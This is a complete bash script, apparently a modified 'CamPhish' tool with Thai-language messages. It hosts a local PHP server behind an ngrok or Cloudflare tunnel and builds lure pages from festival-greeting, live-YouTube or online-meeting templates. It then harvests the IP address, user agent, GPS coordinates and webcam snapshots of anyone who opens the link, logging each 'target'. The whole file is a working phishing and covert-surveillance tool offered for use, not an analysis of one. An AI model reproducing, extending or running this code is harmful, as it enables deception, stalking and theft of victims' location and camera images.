#!/bin/bash
# ============================================================
#  CamPhish Modder v3.0 - Stable Edition
#  Reworked for stability + colorful output
# ============================================================

# ---------- Color palette (pretty + readable) ----------
RESET='\e[0m'
BOLD='\e[1m'
DIM='\e[2m'
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
MAGENTA='\e[1;35m'
CYAN='\e[1;36m'
WHITE='\e[1;97m'
GRAY='\e[0;37m'
ORANGE='\e[38;5;208m'
PINK='\e[38;5;205m'
LIME='\e[38;5;118m'
SKY='\e[38;5;117m'
PURPLE='\e[38;5;141m'
GOLD='\e[38;5;220m'

# ---------- OS detection ----------
windows_mode=false
if [[ "$(uname -a 2>/dev/null)" == *"MINGW"* ]] || [[ "$(uname -a 2>/dev/null)" == *"MSYS"* ]] || [[ "$(uname -a 2>/dev/null)" == *"CYGWIN"* ]]; then
  windows_mode=true
fi

termux_mode=false
if [[ "$(uname -o 2>/dev/null)" == *"Android"* ]] || [[ -n "${PREFIX:-}" && "$PREFIX" == *"com.termux"* ]] || [[ -f "/data/data/com.termux/files/usr/bin/termux-info" ]]; then
  termux_mode=true
fi

PORT=3333

# ---------- Pretty printers ----------
msg_ok()    { printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}%s${RESET}\n" "$1"; }
msg_info()  { printf "${CYAN}[${WHITE}*${CYAN}]${RESET} ${SKY}%s${RESET}\n" "$1"; }
msg_warn()  { printf "${YELLOW}[${WHITE}!${YELLOW}]${RESET} ${GOLD}%s${RESET}\n" "$1"; }
msg_error() { printf "${RED}[${WHITE}x${RED}]${RESET} ${PINK}%s${RESET}\n" "$1"; }
msg_hit()   { printf "${MAGENTA}[${WHITE}»${MAGENTA}]${RESET} ${WHITE}%s${RESET}: ${CYAN}%s${RESET}\n" "$1" "$2"; }

trap 'printf "\n"; stop' INT TERM

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Modder Ver 1.0 \e[0m \n"

printf "\n"


}


dependencies() {
  local missing=0
  for cmd in php curl wget unzip; do
    if ! command -v "$cmd" > /dev/null 2>&1; then
      msg_error "ต้องการ '$cmd' แต่ยังไม่ได้ติดตั้ง"
      missing=1
    fi
  done
  if [[ $missing -eq 1 ]]; then
    msg_warn "ติดตั้งด้วย: apt-get -y install php wget unzip curl"
    exit 1
  fi
  # ps เป็น optional (Termux/Windows บางรุ่นไม่มี)
  if ! command -v ps > /dev/null 2>&1; then
    msg_warn "'ps' ไม่พบ — จะใช้วิธี fallback ในการจัดการ process"
  fi
}

# Escape & \ และ delimiter + สำหรับ sed
escape_sed() {
  printf '%s' "$1" | sed -e 's/[\/&+\\|]/\\&/g'
}

stop() {
  msg_warn "กำลังหยุด services..."
  if [[ "$windows_mode" == true ]]; then
    taskkill /F /IM "ngrok.exe" 2>/dev/null
    taskkill /F /IM "php.exe" 2>/dev/null
    taskkill /F /IM "cloudflared.exe" 2>/dev/null
  else
    # ฆ่าเฉพาะ process ที่เราสร้าง (อิง port + ชื่อ) ไม่ฆ่า php ทั้งเครื่องมั่ว
    if command -v pkill > /dev/null 2>&1; then
      pkill -f "cloudflared.*$PORT" 2>/dev/null
      pkill -f "ngrok.*http.*$PORT" 2>/dev/null
    fi
    # php: หา pid ที่ listen port 3333 ก่อน ถ้าไม่ได้ค่อย fallback
    if command -v fuser > /dev/null 2>&1; then
      fuser -k "$PORT/tcp" 2>/dev/null
    else
      local pids
      pids=$(ps aux 2>/dev/null | grep "[p]hp.*$PORT" | awk '{print $2}')
      if [[ -n "$pids" ]]; then
        # shellcheck disable=SC2086
        kill -9 $pids 2>/dev/null
      else
        # fallback สุดท้าย: ฆ่า php ที่รัน php -S เท่านั้น
        local php_pids
        php_pids=$(ps aux 2>/dev/null | grep "[p]hp -S" | awk '{print $2}')
        [[ -n "$php_pids" ]] && kill $php_pids 2>/dev/null
      fi
    fi
  fi
  msg_ok "หยุดแล้ว เจอกันใหม่ — ${BOLD}CamPhish Modder${RESET}"
  exit 0
}

cleanup_stale() {
  rm -f ip.txt Log.log LocationLog.log LocationError.log current_location.txt \
        .cloudflared.log index.php index2.html index3.html sendlink 2>/dev/null
}

catch_ip() {
  [[ -f "ip.txt" ]] || return 1
  local ip ua
  ip=$(grep -a 'IP:' ip.txt 2>/dev/null | head -n 1 | cut -d " " -f2 | tr -d '\r\n')
  ua=$(grep -a 'User-Agent:' ip.txt 2>/dev/null | head -n 1 | cut -d ":" -f2- | sed 's/^ *//;s/\r//g')
  [[ -z "$ip" ]] && ip="(unknown)"
  msg_hit "IP" "$ip"
  [[ -n "$ua" ]] && msg_hit "User-Agent" "$ua"
  {
    echo "===== $(date '+%Y-%m-%d %H:%M:%S') ====="
    cat ip.txt
    echo ""
  } >> saved.ip.txt 2>/dev/null
}

catch_location() {
  if [[ -f "current_location.txt" ]]; then
    msg_ok "ข้อมูลพิกัดปัจจุบัน:"
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt 2>/dev/null | while IFS= read -r line; do
      printf "  ${CYAN}»${RESET} ${WHITE}%s${RESET}\n" "$line"
    done
    printf "\n"
    # เก็บลง master log กันหาย แล้วค่อย backup
    cat current_location.txt >> saved.locations.txt 2>/dev/null
    mv current_location.txt current_location.bak 2>/dev/null
  fi

  local loc_file
  loc_file=$(ls -t location_*.txt 2>/dev/null | head -n 1)
  if [[ -n "$loc_file" && -f "$loc_file" ]]; then
    local lat lon acc maps_link
    lat=$(grep -a 'Latitude:' "$loc_file" 2>/dev/null | head -n 1 | awk '{print $2}' | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$loc_file" 2>/dev/null | head -n 1 | awk '{print $2}' | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$loc_file" 2>/dev/null | head -n 1 | awk '{print $2}' | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$loc_file" 2>/dev/null | head -n 1 | sed 's/.*Google Maps: *//;s/\r//g')
    [[ -n "$lat" ]] && msg_hit "Latitude" "$lat"
    [[ -n "$lon" ]] && msg_hit "Longitude" "$lon"
    [[ -n "$acc" ]] && msg_hit "Accuracy" "$acc meters"
    [[ -n "$maps_link" ]] && msg_hit "Google Maps" "$maps_link"
    mkdir -p saved_locations 2>/dev/null
    mv "$loc_file" saved_locations/ 2>/dev/null
    msg_ok "บันทึกพิกัดลง saved_locations/$(basename "$loc_file")"
  fi
}

catch_cam() {
  # หาไฟล์ cam*.png ที่ยังไม่เคยแจ้ง
  local f
  for f in cam*.png; do
    [[ -e "$f" ]] || continue
    # ข้ามไฟล์ที่แจ้งไปแล้ว (มี marker)
    [[ -f ".seen_$f" ]] && continue
    msg_hit "Cam file" "$f"
    touch ".seen_$f" 2>/dev/null
  done
  if [[ -f "Log.log" ]]; then
    msg_ok "ได้รับภาพจากกล้องเป้าหมาย!"
    rm -f Log.log
  fi
}

checkfound() {
  mkdir -p saved_locations 2>/dev/null
  printf "\n"
  msg_info "รอเป้าหมาย... ${GRAY}กด Ctrl+C เพื่อออก${RESET}"
  printf "${GREEN}[${WHITE}*${GREEN}]${RESET} ${WHITE}GPS Location tracking${RESET} ${BOLD}${LIME}ACTIVE${RESET}\n"
  printf "${GREEN}[${WHITE}*${GREEN}]${RESET} ${WHITE}Camera capture${RESET} ${BOLD}${LIME}ACTIVE${RESET}\n"
  while true; do
    if [[ -f "ip.txt" ]]; then
      printf "\n${LIME}[${WHITE}+${LIME}]${RESET} ${BOLD}${WHITE}Target เปิดลิงก์แล้ว!${RESET}\n"
      catch_ip
      rm -f ip.txt
    fi
    if [[ -f "current_location.txt" ]] || ls location_*.txt > /dev/null 2>&1; then
      printf "\n${LIME}[${WHITE}+${LIME}]${RESET} ${BOLD}${WHITE}ได้รับข้อมูลพิกัด!${RESET}\n"
      catch_location
    fi
    if [[ -f "LocationLog.log" ]]; then
      printf "\n${LIME}[${WHITE}+${LIME}]${RESET} ${BOLD}${WHITE}ได้รับข้อมูลพิกัด!${RESET}\n"
      catch_location
      rm -f LocationLog.log
    fi
    [[ -f "LocationError.log" ]] && rm -f LocationError.log
    if [[ -f "Log.log" ]] || ls cam*.png > /dev/null 2>&1; then
      # แจ้งเฉพาะเมื่อมีของใหม่ (catch_cam เช็ค marker ให้)
      catch_cam
    fi
    sleep 0.5
  done
}

start_php_server() {
  # ฆ่า server เก่าที่ค้าง port ก่อน
  if command -v fuser > /dev/null 2>&1; then
    fuser -k "$PORT/tcp" 2>/dev/null
  fi
  msg_info "กำลังสตาร์ท PHP server (port $PORT)..."
  if [[ "$termux_mode" == true ]]; then
    php -S 0.0.0.0:"$PORT" > /dev/null 2>&1 &
  else
    php -S 127.0.0.1:"$PORT" > /dev/null 2>&1 &
  fi
  sleep 2
  # ตรวจว่า php รันจริง
  if ! ps aux 2>/dev/null | grep -q "[p]hp.*$PORT"; then
    # ลองเช็คผ่าน curl แทน (บางระบบไม่มี ps)
    if ! curl -s -m 3 "http://127.0.0.1:$PORT/" > /dev/null 2>&1; then
      msg_error "สตาร์ท PHP server ไม่สำเร็จ — เช็คว่า port $PORT ว่างหรือไม่"
      return 1
    fi
  fi
  msg_ok "PHP server พร้อมแล้ว"
}

get_cloudflare_link() {
  local tries=0 link=""
  while [[ $tries -lt 15 ]]; do
    link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null | head -n 1)
    [[ -n "$link" ]] && break
    sleep 2
    tries=$((tries + 1))
  done
  printf '%s' "$link"
}

get_ngrok_link() {
  local link=""
  # รองรับทั้ง ngrok-free.app / ngrok.io / ngrok.dev
  link=$(curl -s -m 5 -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -oE 'https://[^/"'\'']+\.ngrok(-free)?\.(app|io|dev)' 2>/dev/null | head -n 1)
  printf '%s' "$link"
}

build_payload() {
  local link="$1"
  local esc_link
  esc_link=$(escape_sed "$link")
  if [[ -z "$link" ]]; then
    msg_error "ไม่พบ tunnel link — สร้าง payload ไม่ได้"
    exit 1
  fi
  sed "s+forwarding_link+$esc_link+g" template.php > index.php 2>/dev/null
  if [[ "${option_tem:-1}" -eq 1 ]]; then
    local esc_fest
    esc_fest=$(escape_sed "$fest_name")
    sed "s+forwarding_link+$esc_link+g" festivalwishes.html > index3.html 2>/dev/null
    sed "s+fes_name+$esc_fest+g" index3.html > index2.html 2>/dev/null
  elif [[ "${option_tem:-1}" -eq 2 ]]; then
    local esc_yt
    esc_yt=$(escape_sed "$yt_video_ID")
    sed "s+forwarding_link+$esc_link+g" LiveYTTV.html > index3.html 2>/dev/null
    sed "s+live_yt_tv+$esc_yt+g" index3.html > index2.html 2>/dev/null
  else
    sed "s+forwarding_link+$esc_link+g" OnlineMeeting.html > index2.html 2>/dev/null
  fi
  rm -f index3.html
  [[ -f "index.php" && -f "index2.html" ]] || { msg_error "สร้าง payload ไม่สำเร็จ"; exit 1; }
}

cloudflare_tunnel() {
  local bin="cloudflared"
  [[ "$windows_mode" == true ]] && bin="cloudflared.exe"
  if [[ ! -e "$bin" ]]; then
    command -v unzip > /dev/null 2>&1 || { msg_error "ต้องการ unzip — ติดตั้งก่อน"; exit 1; }
    msg_info "กำลังดาวน์โหลด Cloudflared..."
    local arch os
    arch=$(uname -m); os=$(uname -s)
    msg_info "ตรวจพบ OS: $os, Arch: $arch"
    if [[ "$windows_mode" == true ]]; then
      wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1 \
        || { msg_error "ดาวน์โหลดล้มเหลว — เช็คเน็ต"; exit 1; }
      chmod +x cloudflared.exe 2>/dev/null
    elif [[ "$os" == "Darwin" ]]; then
      if [[ "$arch" == "arm64" ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
      else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
      fi
      [[ -e cloudflared.tgz ]] || { msg_error "ดาวน์โหลดล้มเหลว"; exit 1; }
      tar -xzf cloudflared.tgz > /dev/null 2>&1; chmod +x cloudflared; rm -f cloudflared.tgz
    else
      case "$arch" in
        x86_64)          wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
        i686|i386)       wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 ;;
        aarch64|arm64)   wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1 ;;
        armv7l|armv6l|arm*) wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1 ;;
        *)               wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
      esac
      [[ -e cloudflared ]] || { msg_error "ดาวน์โหลดล้มเหลว"; exit 1; }
      chmod +x cloudflared
    fi
  fi

  start_php_server || exit 1
  msg_info "กำลังสตาร์ท Cloudflared tunnel..."
  rm -f .cloudflared.log
  if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:"$PORT" --logfile .cloudflared.log > /dev/null 2>&1 &
  else
    ./cloudflared tunnel -url 127.0.0.1:"$PORT" --logfile .cloudflared.log > /dev/null 2>&1 &
  fi
  sleep 3
  local link
  link=$(get_cloudflare_link)
  if [[ -z "$link" ]]; then
    msg_error "สร้าง Direct link ไม่ได้ — สาเหตุที่พบบ่อย:"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}CloudFlare อาจล่ม / เน็ตหลุด${RESET}\n"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}cloudflared ค้างอยู่ — ลอง: pkill -f cloudflared${RESET}\n"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}Android: เปิด hotspot ก่อนรัน${RESET}\n"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}รันมือ: ./cloudflared tunnel --url 127.0.0.1:%s${RESET}\n" "$PORT"
    exit 1
  else
    msg_hit "Direct link" "$link"
  fi
  build_payload "$link"
  checkfound
}

ngrok_server() {
  local bin="ngrok"
  [[ "$windows_mode" == true ]] && bin="ngrok.exe"
  if [[ ! -e "$bin" ]]; then
    command -v unzip > /dev/null 2>&1 || { msg_error "ต้องการ unzip — ติดตั้งก่อน"; exit 1; }
    msg_info "กำลังดาวน์โหลด Ngrok..."
    local arch os
    arch=$(uname -m); os=$(uname -s)
    msg_info "ตรวจพบ OS: $os, Arch: $arch"
    local url=""
    if [[ "$windows_mode" == true ]]; then
      url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    elif [[ "$os" == "Darwin" ]]; then
      if [[ "$arch" == "arm64" ]]; then url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip"
      else url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"; fi
    else
      case "$arch" in
        x86_64)            url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" ;;
        i686|i386)         url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip" ;;
        aarch64|arm64)     url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" ;;
        armv7l|armv6l|arm*) url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip" ;;
        *)                 url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" ;;
      esac
    fi
    wget --no-check-certificate "$url" -O ngrok.zip > /dev/null 2>&1 || { msg_error "ดาวน์โหลดล้มเหลว"; exit 1; }
    unzip -o ngrok.zip > /dev/null 2>&1; chmod +x "$bin" 2>/dev/null; rm -f ngrok.zip
    [[ -e "$bin" ]] || { msg_error "แตกไฟล์ ngrok ไม่สำเร็จ"; exit 1; }
  fi

  # Auth token
  local ngrok_bin="./$bin"
  local ngrok_cfg="$HOME/.ngrok2/ngrok.yml"
  [[ "$windows_mode" == true ]] && ngrok_cfg="$USERPROFILE\\.ngrok2\\ngrok.yml"
  if [[ -f "$ngrok_cfg" ]]; then
    printf "${GOLD}[${WHITE}*${GOLD}]${RESET} ${WHITE}ngrok config เดิม:${RESET}\n"
    cat "$ngrok_cfg" 2>/dev/null; printf "\n"
    read -p "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}เปลี่ยน authtoken ไหม? [Y/n]: ${RESET}")" chg_token
    if [[ "$chg_token" == "Y" || "$chg_token" == "y" ]]; then
      read -p "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}วาง ngrok authtoken: ${RESET}")" ngrok_auth
      [[ -n "$ngrok_auth" ]] && $ngrok_bin authtoken "$ngrok_auth" > /dev/null 2>&1 && msg_ok "เปลี่ยน authtoken แล้ว"
    fi
  else
    read -p "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}วาง ngrok authtoken: ${RESET}")" ngrok_auth
    [[ -n "$ngrok_auth" ]] && $ngrok_bin authtoken "$ngrok_auth" > /dev/null 2>&1
  fi

  start_php_server || exit 1
  msg_info "กำลังสตาร์ท ngrok..."
  $ngrok_bin http "$PORT" > /dev/null 2>&1 &
  sleep 8
  local link
  link=$(get_ngrok_link)
  # retry อีก 2 รอบเผื่อ ngrok ช้า
  if [[ -z "$link" ]]; then sleep 5; link=$(get_ngrok_link); fi
  if [[ -z "$link" ]]; then
    msg_error "สร้าง Direct link ไม่ได้ — สาเหตุที่พบบ่อย:"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}authtoken ไม่ถูกต้อง${RESET}\n"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}ngrok รันซ้ำ — ลอง: pkill -f ngrok${RESET}\n"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}Android: เปิด hotspot ก่อน${RESET}\n"
    printf "  ${CYAN}[*]${RESET} ${YELLOW}รันมือ: ./ngrok http %s${RESET}\n" "$PORT"
    exit 1
  else
    msg_hit "Direct link" "$link"
  fi
  build_payload "$link"
  checkfound
}

select_template() {
  while true; do
    printf "\n${GREEN}${BOLD}[+]----[ Choose template ]----[+]\n${RESET}"
    printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${GREEN}${BOLD}Festival Wishing${RESET}\n"
    printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${GREEN}${BOLD}Live Youtube TV${RESET}\n"
    printf "${GREEN}[${WHITE}03${GREEN}]${RESET} ${GREEN}${BOLD}Online Meeting${RESET}\n"
    read -p "$(printf "${GREEN}${BOLD}[+] Choose a template: [Default is 1] > ${RESET}")" option_tem
    option_tem="${option_tem:-1}"
    # ตัดช่องว่างหัวท้าย (ไม่ลบช่องว่างกลางเหมือนของเดิม)
    option_tem=$(printf '%s' "$option_tem" | tr -d '[:space:]')
    if ! [[ "$option_tem" =~ ^[1-3]$ ]]; then
      msg_error "ตัวเลือกไม่ถูกต้อง (1-3) ลองใหม่"
      continue
    fi
    break
  done

  if [[ "$option_tem" -eq 1 ]]; then
    read -p "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}ชื่อเทศกาล: ${RESET}")" fest_name
    # trim + ค่าเริ่มต้นกัน sed ว่าง
    fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    [[ -z "$fest_name" ]] && fest_name="Festival"
  elif [[ "$option_tem" -eq 2 ]]; then
    while true; do
      read -p "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}YouTube video ID: ${RESET}")" yt_video_ID
      yt_video_ID=$(printf '%s' "$yt_video_ID" | tr -d '[:space:]')
      # รับทั้ง ID ดิบ (11 ตัวอักษร) หรือ URL เต็ม
      if [[ "$yt_video_ID" =~ v=([^&\ ]+) ]]; then
        yt_video_ID="${BASH_REMATCH[1]}"
      fi
      if [[ "$yt_video_ID" =~ ^[A-Za-z0-9_-]{6,20}$ ]]; then
        break
      else
        msg_error "Video ID ไม่ถูกต้อง ลองใหม่ (เช่น dQw4w9WgXcQ)"
      fi
    done
  fi
}

camphish() {
  rm -f sendlink 2>/dev/null
  cleanup_stale
  printf "\n${GREEN}${BOLD}[+]----[ Choose tunnel server ]----[+]\n${RESET}"
  printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${GREEN}${BOLD}Ngrok${RESET}\n"
  printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${GREEN}${BOLD}CloudFlare Tunnel${RESET}\n"
  local option_server
  read -p "$(printf "${GREEN}${BOLD}[+] Choose a Port Forwarding option: [Default is 1] > ${RESET}")" option_server
  option_server="${option_server:-1}"
  option_server=$(printf '%s' "$option_server" | tr -d '[:space:]')
  select_template
  case "$option_server" in
    1) ngrok_server ;;
    2) cloudflare_tunnel ;;
    *) msg_error "ตัวเลือกไม่ถูกต้อง!"; sleep 1; camphish ;;
  esac
}

banner
dependencies
camphish
